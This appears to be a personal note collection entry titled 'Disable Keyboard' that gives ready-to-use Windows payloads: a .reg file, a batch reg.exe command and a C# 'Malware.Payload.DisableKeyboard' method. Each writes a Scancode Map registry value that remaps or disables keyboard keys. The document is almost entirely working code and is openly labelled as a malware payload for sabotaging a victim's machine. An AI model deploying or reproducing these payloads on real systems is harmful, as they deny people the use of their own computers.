# Disable Keyboard
## Scripting

### Registry

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout]
"Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\
00,3b,00,00,00,3c,00,00,00,3d,00,00,00,3e,00,00,00,3f,00,00,00,40,00,00,00,\
41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\
e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\
00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\
00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\
4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\
e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\
00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\
00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\
10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\
00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\
00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\
00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\
1c,00,00,00,2a,00,00,00,2b,00,00,00,2c,00,00,00,2e,00,00,00,2f,00,00,00,30,\
00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\
00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,33,00,00,00,38,e0,00,00,5c,e0,00,\
00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\
10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\
e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\
00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00
```

Import the registry.

![[Registry Entry#^5259cc]]
### Batch

```
@echo off

set keyMap=00000000000000001b0000007d001e0037003000^
34002e0029002000270012001b0021006be022003be0230021^
e0170056e024004e00250045e02600010032003de031003a00^
1800040019002ee0100030e0130045001f001c001400080016^
0049002f0008e0110058e02d002000150026002c0000000000

reg.exe add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d "%keyMap%"
```

## .NET

### C\#

```cs
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Malware {
    public class Payload {
        public static void DisableKeyboard() {
            byte[] keyboardScancodeMap = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x00,0x00,0x21,0xe0,0x00,0x00,0x6c,0xe0,
            0x00,0x00,0x6d,0xe0,0x00,0x00,0x11,0xe0,0x00,0x00,0x6b,0xe0,0x00,0x00,0x50,0xe0,0x00,0x00,0x4b,0xe0,0x00,0x00,0x4d,0xe0,0x00,
            0x00,0x48,0xe0,0x00,0x00,0x40,0xe0,0x00,0x00,0x42,0xe0,0x00,0x00,0x3b,0xe0,0x00,0x00,0x3e,0xe0,0x00,0x00,0x3c,0xe0,0x00,0x00,
            0x3f,0xe0,0x00,0x00,0x58,0xe0,0x00,0x00,0x07,0xe0,0x00,0x00,0x41,0xe0,0x00,0x00,0x57,0xe0,0x00,0x00,0x43,0xe0,0x00,0x00,0x23,
            0xe0,0x00,0x00,0x3d,0xe0,0x0e,0x00,0x08,0xe0,0x00,0x00,0x28,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x33,0x00,0x00,0x00,0x34,0x00,
            0x00,0x00,0x35,0x00,0x00,0x00,0x27,0x00,0x00,0x00,0x1a,0x00,0x00,0x00,0x2b,0x00,0x00,0x00,0x1b,0x00,0x00,0x00,0x29,0x00,0x00,
            0x00,0x0d,0x00,0x00,0x00,0x0b,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0x05,0x00,0x00,0x00,
            0x06,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x09,0x00,0x00,0x00,0x0a,0x00,0x00,0x00,0x1e,0x00,0x00,0x00,0x30,
            0x00,0x00,0x00,0x2e,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x12,0x00,0x00,0x00,0x21,0x00,0x00,0x00,0x22,0x00,0x00,0x00,0x23,0x00,
            0x00,0x00,0x24,0x00,0x00,0x00,0x32,0x00,0x00,0x00,0x31,0x00,0x00,0x00,0x18,0x00,0x00,0x00,0x19,0x00,0x00,0x00,0x10,0x00,0x00,
            0x00,0x13,0x00,0x00,0x00,0x1f,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x16,0x00,0x00,0x00,0x2f,0x00,0x00,0x00,0x11,0x00,0x00,0x00,
            0x2d,0x00,0x00,0x00,0x15,0x00,0x00,0x00,0x2c,0x00,0x00,0x00,0x52,0x00,0x00,0x00,0x4f,0x00,0x00,0x00,0x50,0x00,0x00,0x00,0x51,
            0x00,0x00,0x00,0x4b,0x00,0x00,0x00,0x4c,0x00,0x00,0x00,0x4d,0x00,0x00,0x00,0x47,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x49,0x00,
            0x00,0x00,0x0e,0x00,0x00,0x00,0x53,0xe0,0x00,0x00,0x5f,0xe0,0x00,0x00,0x00,0x00 };

            // Keyboard layout settings
            RegistryKey keyboardLayoutKey = Registry.LocalMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout");
            keyboardLayoutKey.SetValue("Scancode Map", keyboardScancodeMap, RegistryValueKind.Binary);
            keyboardLayoutKey.Close();
        }
    }
}
```